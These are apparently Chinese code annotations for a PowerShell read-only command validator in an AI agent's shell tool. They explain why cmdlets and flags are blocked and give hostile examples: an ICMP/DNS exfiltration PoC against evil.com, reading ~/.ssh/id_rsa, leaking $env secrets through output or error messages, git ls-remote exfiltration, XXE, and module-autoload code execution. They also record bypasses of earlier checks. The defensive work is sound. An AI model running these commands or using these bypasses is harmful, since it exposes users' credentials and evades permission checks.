ANNOTATIONS = [
    (5, 'after', r'''只读校验：cmdlet 大小写不敏感，全部转小写匹配。'''),
    (115, 'after', r'''argLeaksValue 专治「打印即泄露」：Write-Output $env:SECRET 直接打印，Start-Sleep $env:SECRET 借类型转换报错外泄（Cannot convert value 'sk-...'）。两层检查：元素类型白名单（只放 StringConstant/Parameter）+ 冒号绑定值的 children 树查询——冒号参数是单个 CommandParameterAst，变量藏在 .Argument 子节点里，元素类型看不出来。'''),
    (128, 'after', r'''只读 cmdlet 白名单。用 Object.create(null) 防原型链污染——攻击者命令名 'constructor'/'__proto__' 必须返回 undefined 而不是继承来的 Object.prototype 属性。'''),
    (321, 'before', r'''Select-Xml 被移除：DOCTYPE 里的 SYSTEM/PUBLIC 外部实体在 -Content/-Xml 里会触发网络请求（XXE），而 PowerShell 的 XmlDocument.LoadXml 默认不禁用实体解析。'''),
    (339, 'before', r'''Test-Json 被移除：-Schema（位置 1）接受带 $ref 的 JSON Schema，Test-Json 会去取外链——而 safeFlags 只校验显式 flag，管不了位置参数绑定。'''),
    (358, 'before', r'''convert-path 进了 CMDLET_PATH_CONFIG 做正经路径校验，这里只列路径参数。'''),
    (367, 'after', r'''Join-Path/Split-Path 砍掉 -Resolve：它会碰文件系统验证路径存在，而路径没过允许目录校验。去掉 -Resolve 两者就是纯字符串操作。'''),
    (389, 'before', r'''Get-Clipboard 故意不进白名单——剪贴板里可能是用户复制的密码/API key。bash 同样不自动允许 pbpaste/xclip。'''),
    (439, 'before', r'''Get-Command 被移除：-Name（位置 0，ValueFromPipeline=true）会触发模块自动加载，.psm1 的初始化代码被执行。链路攻击：预置模块到 PSModulePath 再触发 autoload。曾经试过只删 -Name/-Module + 拒位置 StringConstant，但管道输入（'EvilCmdlet' | Get-Command）args 为空、回调根本不被调用。'''),
    (455, 'before', r'''Get-Help 被移除：与 Get-Command 同一套模块 autoload 隐患。'''),
    (500, 'before', r'''Start-Sleep 运行时零副作用，但 Start-Sleep $env:SECRET 借类型转换报错外泄——同一个 argLeaksValue 守卫。'''),
    (520, 'after', r'''Format-*/Measure-Object 从「名字过滤的安全输出」升级为「带参数校验的白名单条目」：calculated-property 哈希表（about_Calculated_Properties）是通用漏洞面，isSafeOutputCommand 这种只看名字的检查会在参数校验之前把它们筛掉。'''),
    (549, 'after', r'''Select/Sort/Group/Where-Object 同 rationale：StringConstant 属性名放行，哈希表/脚本块/变量参数拦截。'''),
    (570, 'after', r'''Out-String/Out-Host 同理：-InputObject 是泄露面。'''),
    (611, 'before', r'''-CimSession 排除：它连接远程主机（网络请求）。以前空配置 = 全 flag 允许。'''),
    (639, 'before', r'''Get-WinEvent 砍 -FilterXml/-FilterHashtable：前者收 DOCTYPE 外部实体（XXE），后者会被元素类型 Other 拦住但显式删更清楚。保留 -FilterXPath（纯字符串模式，无实体解析）。'''),
    (661, 'before', r'''Get-WmiObject/Get-CimInstance 被移除：Win32_PingStatus 这类类枚举时主动发 ICMP，-ComputerName/CimSession 能查远程机器，-Class/-Filter/-Query 接受任意 WMI 类/WQL。PoC：Get-WmiObject -Class Win32_PingStatus -Filter 'Address="evil.com"' 向 evil.com 发 ICMP（DNS 泄露 + 潜在 NTLM 认证泄露）。WMI 还能自动加载 provider DLL。get-cimclass 保留——只列类元数据，不枚举实例。'''),
    (882, 'after', r'''白名单表结束。git/gh/docker/dotnet 是空配置——走共享的外部命令校验（每 flag 检查）。'''),
    (917, 'after', r'''SAFE_OUTPUT_CMDLETS 只剩 out-null：它丢弃一切、没有 -InputObject 泄露面。out-string/out-host 移去白名单（带 argLeaksValue）；foreach/where/select/sort/group/format-*/measure 全部移出——都吃 calculated-property 哈希表或脚本块谓词。'''),
    (943, 'after', r'''PIPELINE_TAIL_CMDLETS：从 SAFE_OUTPUT_CMDLETS 搬到白名单的管道尾部变压器，给 checkPermissionMode 和 isReadOnlyCommand 的窄回调用——保留「跳过无害管道尾」行为但带 argLeaksValue 守卫。'''),
    (964, 'after', r'''where.exe 白名单外泄记：classifyCommandName 把任何带点的名字判 'application'，nameType 门会在查白名单前拒掉。但 where.exe 是 bash which 的等价物、纯读无危险 flag。SECURITY：只匹配 cmd.text 的首个原始 token——stripModulePrefix 会把 scripts\where.exe 折叠成 where.exe，而 cmd.text 保留原始文本，防伪装。'''),
    (996, 'after', r'''resolveToCanonical：剥 Windows 可执行扩展名（.exe/.cmd/.bat/.com）再走别名表，让 git.exe 也触发 git 安全守卫。SECURITY：只对不含路径分隔符的裸名剥后缀——scripts\git.exe 是跑本地脚本，不是 PATH 里的 git。'''),
    (1033, 'after', r'''isCwdChangingCmdlet 覆盖两类「改变路径解析命名空间」的 cmdlet：cwd 变更（Set-Location 家族）+ PSDrive 创建（New-PSDrive，p:/foo 之后按新驱动器根解析）。名字保持与 BashTool 的 compoundCommandHasCd 对齐，语义更宽。'''),
    (1082, 'after', r'''isProvablySafeStatement：fail-closed 闸门，只有「每个元素都是 CommandAst 的 PipelineAst」返回 true。赋值、控制流、表达式源、链式运算符一律 false——未来新增 AST 类型默认落进 false。'''),
    (1101, 'after', r'''lookupAllowlist 先直查再走别名解析。'''),
    (1159, 'after', r'''hasSyncSecurityConcerns：同步接口（Tool.isReadOnly）用的正则预过滤。注意 @ 的匹配排除了前导词字符和点——user@example.com 不是 splatting，file.@{u} 也不是，但 @splat / ;@splat / ^@splat 是。'''),
    (1222, 'after', r'''复合命令含 cd + 其他语句时禁止自动判只读（finding #27）：Set-Location ~; Get-Content ./.ssh/id_rsa 两条都在白名单，但路径按陈旧 cwd 校验、运行时按 ~ 读取。'''),
    (1285, 'before', r'''管道尾部命令：安全输出 cmdlet 只在零参数时短路——Out-String -InputObject:(rm x) 的括号在 Out-String 运行时求值，名字过滤加带参就会绕过。'''),
    (1379, 'after', r'''元素类型白名单：只放 StringConstant/Parameter。Get-Process $env:AWS_SECRET_ACCESS_KEY 会让 PowerShell 报「找不到进程 'sk-ant-...'」——模型从错误里读到 secret。elementTypes 缺失 = fail-closed（真实解析器总会设置）。'''),
    (1432, 'before', r'''外部命令（git/gh/docker/dotnet）走共享校验——放在元素类型闸门之后，让它们也吃这层防护。'''),
    (1441, 'after', r'''Windows 上 / 是原生命令的合法 flag 前缀（findstr /S），但 cmdlet 永远用 -。区分方式：canonical 名含连字符 = cmdlet。'''),
    (1516, 'after', r'''isAllowlistedCommand 结束。allowAllFlags = 整个 flag 面只读；空 safeFlags = 只收位置参数、拒所有 flag（安全默认，不是全允许）。'''),
    (1535, 'after', r'''外部命令分派。'''),
    (1553, 'after', r'''git 危险全局 flag：-c/-C/--exec-path/--git-dir 等能改配置或换仓库。--attr-source 单列——它制造解析器差异：git 把 tree-ish 值后的 token 当 pathspec，我们的 skip-by-2 循环却把它当子命令（git --attr-source HEAD~10 log status 实际跑的是 git status）。'''),
    (1576, 'after', r'''吃独立值的全局 flag 必须完整列出：漏一个就制造解析器差异——校验器把值当子命令，git 消费值后跑下一个 token。已按 man git + GIT_TRACE（git 2.51）核对。'''),
    (1701, 'after', r'''isGitSafe 结束。子命令查表先试两词（git stash list）再试一词；ls-remote 带 URL 是数据外泄向量（把秘密编进主机名 → DNS/HTTP），拒绝 ://、@、:、$ 形态的位置参数。'''),
    (1757, 'after', r'''isGhSafe：gh 全是网络面，仅 ant 用户可用。$ 变量一律拒——gh search repos $env:SECRET_API_KEY 会把秘密发到 GitHub API。'''),
    (1807, 'after', r'''isDockerSafe：$ 守卫挪到快速路径之前——以前的位置对 docker ps 永不触发，而 docker ps --format $env:AWS_SECRET_ACCESS_KEY 会让 docker 把秘密吐在输出里。检查全部参数（子命令槽也可能是 $env:X）。'''),
    (1823, 'after', r'''isDotnetSafe：dotnet 顶层只放行四个信息类查看 flag（版本/运行时列表/SDK 列表），其余参数一律拒。'''),
]
